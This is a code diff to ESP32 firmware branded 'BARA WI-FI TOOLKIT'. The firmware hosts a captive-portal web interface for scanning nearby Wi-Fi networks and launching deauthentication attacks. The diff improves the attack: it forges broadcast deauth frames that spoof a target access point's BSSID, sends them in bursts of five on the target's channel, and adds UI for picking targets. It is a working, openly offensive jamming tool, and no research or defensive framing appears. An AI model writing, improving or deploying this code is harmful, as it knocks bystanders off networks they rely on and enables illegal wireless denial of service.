@@ -18,18 +18,19 @@
 const char* AP_SSID = "bara";
 const char* AP_PASS = "A7med@Elshab7";
 const uint16_t WEB_PORT = 80;
-const uint8_t MAX_NETWORKS = 50; // Scan up to 50 networks
+const uint8_t MAX_NETWORKS = 50;
 
 // ==================== 🧠 GLOBAL VARIABLES ====================
 DNSServer dnsServer;
 AsyncWebServer server(WEB_PORT);
 
 bool deauthActive = false;
+uint8_t deauthTargetMAC[6] = {0};
 String deauthTargetBSSID = "";
 unsigned long lastDeauthTime = 0;
-const unsigned long DEAUTH_INTERVAL_MS = 80; // Aggressive: 80ms between packets
+const unsigned long DEAUTH_INTERVAL_MS = 100;
 
-// For scan results (static allocation for stability)
+// For scan results
 struct WiFiNetwork {
     String bssid;
     String ssid;
@@ -49,7 +50,6 @@ const char index_html[] PROGMEM = R"rawliteral(
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🩸 BARA WI-FI TOOLKIT 🩸</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>💀</text></svg>">
     <style>
         :root {
             --blood-red: #ff0000;
@@ -62,34 +62,22 @@ const char index_html[] PROGMEM = R"rawliteral(
             box-sizing: border-box;
         }
         body {
-            background: var(--dark-bg) url("data:image/svg+xml,%3Csvg width='100' height='100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M20,20 Q40,5 60,20 T100,20 L100,100 L0,100 L0,20 Z' fill='none' stroke='%23ff0000' stroke-opacity='0.07' stroke-width='2'/%3E%3C/svg%3E");
+            background: var(--dark-bg);
             color: #ff3333;
             font-family: 'Courier New', monospace;
             overflow-x: hidden;
             position: relative;
+            min-height: 100vh;
         }
         body::before {
             content: "";
-            position: absolute;
+            position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
             background: 
                 radial-gradient(circle at 10% 20%, rgba(255,0,0,0.07) 0%, transparent 40%),
                 radial-gradient(circle at 90% 80%, rgba(255,0,0,0.09) 0%, transparent 45%);
             pointer-events: none;
             z-index: -1;
-        }
-        .blood-drop {
-            position: absolute;
-            background: radial-gradient(circle, rgba(255,0,0,0.4) 0%, transparent 70%);
-            border-radius: 50%;
-            opacity: 0;
-            animation: fall 12s infinite ease-in;
-        }
-        @keyframes fall {
-            0% { transform: translateY(-100px); opacity: 0; }
-            10% { opacity: 0.7; }
-            90% { opacity: 0.5; }
-            100% { transform: translateY(100vh); opacity: 0; }
         }
         .container {
             max-width: 900px;
@@ -162,6 +150,11 @@ const char index_html[] PROGMEM = R"rawliteral(
             box-shadow: 0 0 20px rgba(255,0,0,0.9);
         }
         .btn:active { transform: translateY(1px); }
+        .btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
         .input-group {
             margin: 15px 0;
         }
@@ -219,8 +212,8 @@ const char index_html[] PROGMEM = R"rawliteral(
         @media (max-width: 768px) {
             .container { padding: 10px; }
             h1 { font-size: 2.4em; }
-            input[type="text"] { width: 200px; font-size: 14px; }
-            .btn { padding: 10px 18px; font-size: 14px; }
+            input[type="text"] { width: 100%; font-size: 14px; }
+            .btn { padding: 10px 18px; font-size: 14px; width: 100%; margin: 5px 0; }
         }
     </style>
 </head>
@@ -234,8 +227,8 @@ const char index_html[] PROGMEM = R"rawliteral(
         <div class="card">
             <h2>⚡ SYSTEM STATUS</h2>
             <div id="status" class="status-bar">Initializing hotspot...</div>
-            <button class="btn" onclick="scan()">SCAN NETWORKS</button>
-            <button class="btn" onclick="toggleDeauth()">.Toggle Deauth Panel</button>
+            <button class="btn" id="scanBtn" onclick="scan()">📡 SCAN NETWORKS</button>
+            <button class="btn" onclick="toggleDeauth()">⚔️ Toggle Deauth Panel</button>
             <div id="deauthPanel" style="display:none; margin-top:15px;">
                 <div class="input-group">
                     <input type="text" id="bssidInput" placeholder="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)" maxlength="17">
@@ -257,7 +250,9 @@ const char index_html[] PROGMEM = R"rawliteral(
                         <th>ACTION</th>
                     </tr>
                 </thead>
-                <tbody id="networkTable"></tbody>
+                <tbody id="networkTable">
+                    <tr><td colspan="5" style="text-align:center;">Press SCAN NETWORKS to begin...</td></tr>
+                </tbody>
             </table>
         </div>
 
@@ -296,16 +291,26 @@ const char index_html[] PROGMEM = R"rawliteral(
         }
 
         async function scan() {
+            const btn = document.getElementById('scanBtn');
             try {
-                updateStatus('📡 Scanning... (may take 5s)', 'warning');
+                btn.disabled = true;
+                btn.textContent = '⏳ Scanning...';
+                updateStatus('📡 Scanning networks... (may take 5-10s)', 'warning');
+                log('Initiating network scan...', 'info');
+                
                 const res = await fetch('/scan');
+                if (!res.ok) throw new Error('Scan request failed');
+                
                 const data = await res.json();
                 renderNetworks(data);
-                updateStatus(`✅ Found ${data.length} networks`, 'success');
-                log(`Scanned ${data.length} networks`, 'success');
+                updateStatus(`✅ Found ${data.length} network(s)`, 'success');
+                log(`Scan complete: ${data.length} network(s) found`, 'success');
             } catch (e) {
                 updateStatus('❌ Scan failed', 'error');
                 log('Scan error: ' + e.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = '📡 SCAN NETWORKS';
             }
         }
 
@@ -315,19 +320,26 @@ const char index_html[] PROGMEM = R"rawliteral(
             tbody.innerHTML = '';
             countEl.textContent = networks.length;
 
+            if (networks.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No networks found</td></tr>';
+                return;
+            }
+
             networks.forEach(net => {
                 const row = tbody.insertRow();
                 row.insertCell().textContent = net.bssid;
-                row.insertCell().textContent = net.ssid || 'HIDDEN';
+                row.insertCell().textContent = net.ssid || '*** HIDDEN ***';
                 row.insertCell().textContent = net.rssi + ' dBm';
                 row.insertCell().textContent = net.channel;
                 const btnCell = row.insertCell();
                 const btn = document.createElement('button');
                 btn.className = 'btn';
-                btn.textContent = 'SELECT';
+                btn.textContent = '🎯 SELECT';
+                btn.style.padding = '6px 12px';
+                btn.style.fontSize = '14px';
                 btn.onclick = () => {
                     document.getElementById('bssidInput').value = net.bssid;
-                    log(`Selected target: ${net.bssid}`, 'warning');
+                    log(`Selected target: ${net.bssid} (${net.ssid || 'HIDDEN'})`, 'warning');
                 };
                 btnCell.appendChild(btn);
             });
@@ -338,30 +350,34 @@ const char index_html[] PROGMEM = R"rawliteral(
             panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
         }
 
-        function startDeauth() {
+        async function startDeauth() {
             const bssid = document.getElementById('bssidInput').value.trim().toUpperCase();
             if (!bssid || !/^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/.test(bssid)) {
                 alert('⚠️ Invalid BSSID format! Use AA:BB:CC:DD:EE:FF');
+                log('Invalid BSSID format provided', 'error');
                 return;
             }
-            fetch(`/deauth?bssid=${encodeURIComponent(bssid)}`)
-                .then(r => r.text())
-                .then(msg => {
-                    log(msg, 'warning');
-                    updateStatus('🔥 DEAUTH ACTIVE — Target: ' + bssid, 'warning');
-                })
-                .catch(e => {
-                    log('Deauth start error: ' + e.message, 'error');
-                });
+            
+            try {
+                const res = await fetch(`/deauth?bssid=${encodeURIComponent(bssid)}`);
+                const msg = await res.text();
+                log(msg, 'warning');
+                updateStatus('🔥 DEAUTH ACTIVE — Target: ' + bssid, 'warning');
+            } catch (e) {
+                log('Deauth start error: ' + e.message, 'error');
+                updateStatus('❌ Failed to start deauth', 'error');
+            }
         }
 
-        function stopDeauth() {
-            fetch('/stopdeauth')
-                .then(r => r.text())
-                .then(msg => {
-                    log(msg, 'success');
-                    updateStatus('✅ Deauth stopped', 'success');
-                });
+        async function stopDeauth() {
+            try {
+                const res = await fetch('/stopdeauth');
+                const msg = await res.text();
+                log(msg, 'success');
+                updateStatus('✅ Deauth stopped', 'success');
+            } catch (e) {
+                log('Deauth stop error: ' + e.message, 'error');
+            }
         }
 
         // Auto-refresh status
@@ -369,28 +385,14 @@ const char index_html[] PROGMEM = R"rawliteral(
             fetch('/status')
                 .then(r => r.json())
                 .then(data => {
-                    if (data.deauthActive) {
+                    if (data.deauthActive && data.target) {
                         updateStatus(`🔥 DEAUTH ACTIVE — ${data.target}`, 'warning');
                     }
                 })
                 .catch(() => {});
         }, 2000);
 
-        // Create blood drops
-        setInterval(() => {
-            if (Math.random() > 0.7) {
-                const drop = document.createElement('div');
-                drop.className = 'blood-drop';
-                drop.style.left = Math.random() * 100 + 'vw';
-                drop.style.width = (Math.random() * 30 + 10) + 'px';
-                drop.style.height = drop.style.width;
-                drop.style.animationDuration = (8 + Math.random() * 8) + 's';
-                document.body.appendChild(drop);
-                setTimeout(() => drop.remove(), 15000);
-            }
-        }, 500);
-
-        log('BARA Toolkit loaded. Ready for action.', 'success');
+        log('BARA Toolkit initialized successfully', 'success');
         updateStatus('✅ Hotspot active — Connect to "bara"', 'success');
     </script>
 </body>
@@ -399,13 +401,26 @@ const char index_html[] PROGMEM = R"rawliteral(
 
 // ==================== 📡 WIFI SCAN FUNCTION ====================
 String scanWiFiNetworks() {
-    if (scanInProgress) return "[]";
+    if (scanInProgress) {
+        return "{\"error\":\"Scan already in progress\"}";
+    }
+    
     scanInProgress = true;
+    Serial.println("Starting WiFi scan...");
+    
+    // Synchronous scan with optimal settings
+    int n = WiFi.scanNetworks(false, true, false, 300);
+    
+    if (n < 0) {
+        scanInProgress = false;
+        Serial.println("Scan failed");
+        return "[]";
+    }
+    
+    scannedCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
+    Serial.printf("Found %d networks\n", scannedCount);
 
-    int n = WiFi.scanNetworks(true, false, false, 300, 0); // async=false, hidden=true
-    scannedCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : (n < 0 ? 0 : n);
-
-    StaticJsonDocument<2048> doc;
+    DynamicJsonDocument doc(4096);
     JsonArray networks = doc.to<JsonArray>();
 
     for (int i = 0; i < scannedCount; i++) {
@@ -414,81 +429,122 @@ String scanWiFiNetworks() {
         net["ssid"] = WiFi.SSID(i);
         net["rssi"] = WiFi.RSSI(i);
         net["channel"] = WiFi.channel(i);
+        
+        // Store for later use
+        scannedNetworks[i].bssid = WiFi.BSSIDstr(i);
+        scannedNetworks[i].ssid = WiFi.SSID(i);
+        scannedNetworks[i].rssi = WiFi.RSSI(i);
+        scannedNetworks[i].channel = WiFi.channel(i);
     }
 
     String json;
     serializeJson(doc, json);
+    
+    WiFi.scanDelete();
     scanInProgress = false;
+    
     return json;
 }
 
-// ==================== 📡 SEND SINGLE DEAUTH PACKET ====================
-void sendDeauthPacket(const uint8_t* targetBSSID) {
+// ==================== 🔪 DEAUTH PACKET CONSTRUCTION ====================
+void sendDeauthFrame(const uint8_t* bssid, uint8_t channel) {
+    // Set channel
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+    
+    // Deauth frame structure (IEEE 802.11)
     uint8_t deauthPacket[26] = {
-        0xC0, 0x00,                           // Type: Deauth
-        0x3A, 0x01,                           // Duration: 314 us
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Receiver: Broadcast
-        targetBSSID[0], targetBSSID[1], targetBSSID[2],
-        targetBSSID[3], targetBSSID[4], targetBSSID[5], // Source = Target BSSID
-        targetBSSID[0], targetBSSID[1], targetBSSID[2],
-        targetBSSID[3], targetBSSID[4], targetBSSID[5], // BSSID = Target
-        0x00, 0x00,                           // Sequence (static is fine for deauth)
-        0x01, 0x00                            // Reason: Unspecified
+        /* Frame Control */
+        0xC0, 0x00,                           // Type/Subtype: Deauthentication
+        /* Duration */
+        0x3A, 0x01,
+        /* Destination: Broadcast */
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+        /* Source: Target AP */
+        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+        /* BSSID: Target AP */
+        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+        /* Sequence Control */
+        0x00, 0x00,
+        /* Reason Code: Deauthenticated because sending station is leaving */
+        0x01, 0x00
     };
 
-    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+    // Send multiple frames for effectiveness
+    for (int i = 0; i < 5; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
+        delayMicroseconds(100);
+    }
 }
 
 // ==================== 🌐 WEB HANDLERS ====================
 void setupWebServer() {
+    // Main page
     server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
         request->send_P(200, "text/html", index_html);
     });
 
+    // Scan endpoint
     server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
         String json = scanWiFiNetworks();
         request->send(200, "application/json", json);
     });
 
+    // Start deauth
     server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request) {
         if (!request->hasParam("bssid")) {
-            request->send(400, "text/plain", "BSSID parameter required");
+            request->send(400, "text/plain", "ERROR: BSSID parameter required");
             return;
         }
 
-        String bssid = request->getParam("bssid")->value();
-        // Simple validation
-        if (bssid.length() != 17) {
-            request->send(400, "text/plain", "Invalid BSSID length");
+        String bssidStr = request->getParam("bssid")->value();
+        bssidStr.toUpperCase();
+        
+        // Validate BSSID format
+        if (bssidStr.length() != 17) {
+            request->send(400, "text/plain", "ERROR: Invalid BSSID length");
             return;
         }
 
-        uint8_t mac[6];
-        int parsed = sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-            &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+        // Parse BSSID
+        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+            &deauthTargetMAC[0], &deauthTargetMAC[1], &deauthTargetMAC[2],
+            &deauthTargetMAC[3], &deauthTargetMAC[4], &deauthTargetMAC[5]);
+            
         if (parsed != 6) {
-            request->send(400, "text/plain", "Invalid BSSID format");
+            request->send(400, "text/plain", "ERROR: Invalid BSSID format (use AA:BB:CC:DD:EE:FF)");
             return;
         }
 
-        deauthTargetBSSID = bssid;
+        deauthTargetBSSID = bssidStr;
         deauthActive = true;
         lastDeauthTime = millis();
-        request->send(200, "text/plain", "DEAUTH ATTACK INITIATED ON: " + bssid);
+        
+        Serial.printf("Deauth attack started on: %s\n", bssidStr.c_str());
+        request->send(200, "text/plain", "⚡ DEAUTH ATTACK INITIATED ON: " + bssidStr);
     });
 
+    // Stop deauth
     server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
         deauthActive = false;
-        request->send(200, "text/plain", "DEAUTH ATTACK STOPPED");
+        Serial.println("Deauth attack stopped");
+        request->send(200, "text/plain", "✅ DEAUTH ATTACK STOPPED");
     });
 
+    // Status endpoint
     server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
-        StaticJsonDocument<200> status;
+        DynamicJsonDocument status(256);
         status["deauthActive"] = deauthActive;
         status["target"] = deauthActive ? deauthTargetBSSID : "";
+        status["uptime"] = millis() / 1000;
+        
         String json;
         serializeJson(status, json);
         request->send(200, "application/json", json);
+    });
+
+    // 404 handler
+    server.onNotFound([](AsyncWebServerRequest *request) {
+        request->redirect("/");
     });
 
     server.begin();
@@ -497,44 +553,63 @@ void setupWebServer() {
 // ==================== 🧪 SETUP ====================
 void setup() {
     Serial.begin(115200);
-    Serial.println("\n🩸 BARA WI-FI TOOLKIT — INITIALIZING...");
+    delay(1000);
+    Serial.println("\n\n");
+    Serial.println("==============================================");
+    Serial.println("🩸 BARA WI-FI TOOLKIT — INITIALIZING... 🩸");
+    Serial.println("==============================================");
 
-    // Enable promiscuous mode for raw packet injection
-    wifi_promiscuous_filter_t filter = { .filter_mask = 0 };
-    esp_wifi_set_promiscuous_filter(&filter);
-    esp_wifi_set_promiscuous(true);
-
-    // Start SoftAP
-    WiFi.mode(WIFI_AP);
+    // Configure WiFi mode
+    WiFi.mode(WIFI_AP_STA);
+    
+    // Start Access Point
+    Serial.println("Starting Access Point...");
     WiFi.softAP(AP_SSID, AP_PASS);
-    WiFi.softAPdisconnect(false); // Keep AP alive
-
+    
     IPAddress IP = WiFi.softAPIP();
+    Serial.print("🔥 Hotspot SSID: ");
+    Serial.println(AP_SSID);
     Serial.print("🔥 Hotspot IP: ");
     Serial.println(IP);
 
-    // Start DNS (Captive Portal)
+    // Start DNS server for captive portal
     dnsServer.start(53, "*", IP);
+    Serial.println("✅ DNS Server started");
 
-    // Web server
+    // Setup web server
     setupWebServer();
+    Serial.println("✅ Web Server started");
 
-    Serial.println("✅ BARA is LIVE and READY for action!");
+    Serial.println("==============================================");
+    Serial.println("✅ BARA is LIVE and READY!");
+    Serial.println("Connect to 'bara' and navigate to:");
+    Serial.print("http://");
+    Serial.println(IP);
+    Serial.println("==============================================\n");
 }
 
 // ==================== 🔁 MAIN LOOP ====================
 void loop() {
+    // Process DNS requests
     dnsServer.processNextRequest();
 
-    // Non-blocking Deauth attack
-    if (deauthActive && (millis() - lastDeauthTime >= DEAUTH_INTERVAL_MS)) {
-        uint8_t targetMAC[6];
-        sscanf(deauthTargetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-               &targetMAC[0], &targetMAC[1], &targetMAC[2],
-               &targetMAC[3], &targetMAC[4], &targetMAC[5]);
-        sendDeauthPacket(targetMAC);
-        lastDeauthTime = millis();
+    // Execute deauth attack if active
+    if (deauthActive) {
+        unsigned long currentTime = millis();
+        if (currentTime - lastDeauthTime >= DEAUTH_INTERVAL_MS) {
+            // Find channel for target
+            uint8_t targetChannel = 1;
+            for (int i = 0; i < scannedCount; i++) {
+                if (scannedNetworks[i].bssid == deauthTargetBSSID) {
+                    targetChannel = scannedNetworks[i].channel;
+                    break;
+                }
+            }
+            
+            sendDeauthFrame(deauthTargetMAC, targetChannel);
+            lastDeauthTime = currentTime;
+        }
     }
 
-    delay(1); // Yield to WiFi tasks
+    delay(1);
 }
